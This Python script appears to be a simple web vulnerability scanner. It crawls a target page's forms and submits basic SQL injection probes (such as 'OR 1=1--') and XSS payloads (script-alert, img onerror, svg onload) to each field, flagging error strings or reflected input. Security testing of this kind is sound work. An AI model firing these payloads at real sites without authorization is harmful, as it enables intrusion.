import requests
from bs4 import BeautifulSoup
import re  # For more advanced XSS checks

def scan_page(url):
    """
    Fetches the web page, parses it, and initiates vulnerability scans.

    Args:
        url (str): The URL of the target web application.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for bad status codes
        soup = BeautifulSoup(response.content, 'html.parser')
        print(f"[*] Scanning: {url}")
        find_forms(soup, url)
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching {url}: {e}")

def find_forms(soup, base_url):
    """
    Finds all HTML forms on the page and analyzes their input fields.

    Args:
        soup (BeautifulSoup): The parsed HTML content of the page.
        base_url (str): The base URL of the web application.
    """
    forms = soup.find_all('form')
    for form in forms:
        form_action = form.get('action', base_url)
        print(f"\n[+] Found form: {form_action}")
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                input_type = input_field.get('type', 'text')
                print(f"  [+] Input field: {name} (type: {input_type})")
                test_sql_injection(base_url, form, input_field)
                test_xss(base_url, form, input_field)

def test_sql_injection(base_url, form, input_field):
    """
    Performs basic SQL injection testing on an input field.

    Args:
        base_url (str): The base URL of the web application.
        form (BeautifulSoup Tag): The HTML form element.
        input_field (BeautifulSoup Tag): The HTML input field element.
    """
    payloads = ["'", "--", "/*", "OR 1=1--", "OR 1=1/*"]  # More common payloads
    input_name = input_field.get('name')
    if not input_name:
        return

    method = form.get('method', 'get').lower()
    action = form.get('action', base_url)
    absolute_url = requests.compat.urljoin(base_url, action)

    for payload in payloads:
        data = {input_name: payload}
        try:
            if method == 'get':
                response = requests.get(absolute_url, params=data)
            elif method == 'post':
                response = requests.post(absolute_url, data=data)

            if "sql syntax error" in response.text.lower() or "mysql_error" in response.text.lower() or "postgresql error" in response.text.lower() or "invalid syntax" in response.text.lower():
                print(f"  [!] Potential SQL Injection in '{input_name}' with payload: {payload}")
                break  # Found one, no need to try more for this field
        except requests.exceptions.RequestException as e:
            print(f"  [!] Error during SQLi test: {e}")

def test_xss(base_url, form, input_field):
    """
    Performs basic Cross-Site Scripting (XSS) testing on an input field.

    Args:
        base_url (str): The base URL of the web application.
        form (BeautifulSoup Tag): The HTML form element.
        input_field (BeautifulSoup Tag): The HTML input field element.
    """

    payloads = [
        "<script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS');>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"'><script>alert(1)</script>"
    ]  # More common XSS payloads

    input_name = input_field.get('name')
    if not input_name:
        return

    method = form.get('method', 'get').lower()
    action = form.get('action', base_url)
    absolute_url = requests.compat.urljoin(base_url, action)

    for payload in payloads:
        data = {input_name: payload}
        try:
            if method == 'get':
                response = requests.get(absolute_url, params=data)
            elif method == 'post':
                response = requests.post(absolute_url, data=data)

            # More robust XSS check using regular expressions
            if re.search(re.escape(payload), response.text):
                print(f"  [!] Potential XSS in '{input_name}' with payload: {payload}")
                break
        except requests.exceptions.RequestException as e:
            print(f"  [!] Error during XSS test: {e}")

if __name__ == "__main__":
    target_url = input("[+] Enter the target web application URL: ")
    scan_page(target_url)